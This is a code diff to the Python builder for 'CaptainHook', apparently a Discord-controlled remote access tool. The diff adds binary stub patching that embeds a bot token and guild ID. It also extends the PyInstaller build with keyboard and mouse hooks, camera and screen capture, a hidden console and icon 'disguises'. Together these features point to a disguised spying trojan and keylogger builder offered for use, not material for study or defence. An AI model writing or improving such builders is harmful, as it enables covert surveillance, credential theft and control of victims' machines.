@@ -126,10 +126,72 @@ def get_config():
     
     return token, guild_id, selected_preset_name, selected_disguise
 
+def patch_stub(stub_path, output_path, token, guild_id):
+    """Perform binary search-and-replace on a pre-compiled stub."""
+    try:
+        with open(stub_path, "rb") as f:
+            data = f.read()
+
+        # Placeholders as they appear in the binary (UTF-8 encoded)
+        token_placeholder = b"TOKEN_PLACEHOLDER_64_BYTES____________________________________"
+        guild_placeholder = b"GUILD_ID_PLACEHOLDER_32_BYTES_______"
+
+        if token_placeholder not in data:
+            return False, "Discord Token placeholder not found in stub binary."
+        
+        # Prepare replacement data (must be padded with null bytes to same length)
+        new_token = token.encode('utf-8')
+        if len(new_token) > len(token_placeholder):
+             return False, "Token is too long for the placeholder."
+        new_token = new_token.ljust(len(token_placeholder), b'\x00')
+
+        new_guild = guild_id.encode('utf-8')
+        if len(new_guild) > len(guild_placeholder):
+             return False, "Guild ID is too long for the placeholder."
+        new_guild = new_guild.ljust(len(guild_placeholder), b'\x00')
+
+        # Replace in binary
+        patched_data = data.replace(token_placeholder, new_token)
+        patched_data = patched_data.replace(guild_placeholder, new_guild)
+
+        with open(output_path, "wb") as f:
+            f.write(patched_data)
+        
+        return True, None
+    except Exception as e:
+        return False, str(e)
+
 def build(token, guild_id, preset_name, disguise_name):
     preset = PRESETS[preset_name]
     disguise = DISGUISES[disguise_name]
     
+    # 1. Check for Stub Mode
+    # Stubs should be placed in a 'stubs' directory relative to the builder
+    ext = ".exe" if os.name == 'nt' else ""
+    stub_filename = f"stub_{preset_name.lower().replace(' ', '_')}{ext}"
+    stub_path = os.path.join("stubs", stub_filename)
+    
+    if os.path.exists(stub_path):
+        console.print(f"\n[bold cyan]⚡ STUB MODE DETECTED![/bold cyan]")
+        console.print(f"Using pre-compiled stub: [yellow]{stub_path}[/yellow]")
+        
+        output_name = f"CaptainHook{ext}"
+        os.makedirs("dist", exist_ok=True)
+        output_path = os.path.join("dist", output_name)
+        
+        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
+            progress.add_task(description="Patching binary stub...", total=None)
+            success, error = patch_stub(stub_path, output_path, token, guild_id)
+        
+        if success:
+            console.print(f"\n[bold green]✅ INSTANT BUILD SUCCESSFUL![/bold green]")
+            console.print(f"Bot saved to: [bold yellow]{output_path}[/bold yellow]")
+            return
+        else:
+            console.print(f"\n[bold red]❌ Stub Patching Failed:[/bold red] {error}")
+            console.print("Falling back to full compilation...")
+
+    # 2. Regular Compilation Mode (Fallback)
     console.print(f"\n[bold green]🏗️  Building {preset_name} disguised as {disguise_name}...[/bold green]\n")
     
     with Progress(
@@ -196,7 +258,15 @@ def build(token, guild_id, preset_name, disguise_name):
         progress.add_task(description="Setting up distribution folder...", total=None)
         os.makedirs("dist", exist_ok=True)
         
-        hidden_imports = ["--hidden-import=pynput.keyboard._xorg", "--hidden-import=pynput.mouse._xorg"]
+        # Standard hidden imports that often cause issues
+        hidden_imports = [
+            "--hidden-import=pynput.keyboard._xorg", 
+            "--hidden-import=pynput.mouse._xorg",
+            "--hidden-import=audioop",
+            "--hidden-import=cv2",
+            "--hidden-import=numpy"
+        ]
+        
         for module in preset["modules"]:
             hidden_imports.append(f"--hidden-import=src.client.modules.{module}")
         
@@ -205,14 +275,17 @@ def build(token, guild_id, preset_name, disguise_name):
         
         noconsole = "--noconsole" if not preset.get("developer", False) else ""
         
+        # Build command with optimized options
+        # --collect-all often helps with missing data files in larger libraries
+        cmd = f"pyinstaller --onefile {noconsole} --name CaptainHook --paths={staging_root} {hidden_imports_str} --collect-all discord --collect-all mss build_staging/src/client/main.py"
+        
         if os.name == 'nt':
-            cmd = f"pyinstaller --onefile {noconsole} --icon={disguise['icon']} --name CaptainHook --paths={staging_root} {hidden_imports_str} build_staging/src/client/main.py"
+            cmd = cmd.replace("--name CaptainHook", f"--name CaptainHook --icon={disguise['icon']}")
             ext = ".exe"
             script_name = "dist/build.bat"
             with open(script_name, "w") as f:
                 f.write(f"@echo off\n{cmd}\n")
         else:
-            cmd = f"pyinstaller --onefile {noconsole} --name CaptainHook --paths={staging_root} {hidden_imports_str} build_staging/src/client/main.py"
             ext = ""
             script_name = "dist/build.sh"
             with open(script_name, "w") as f:
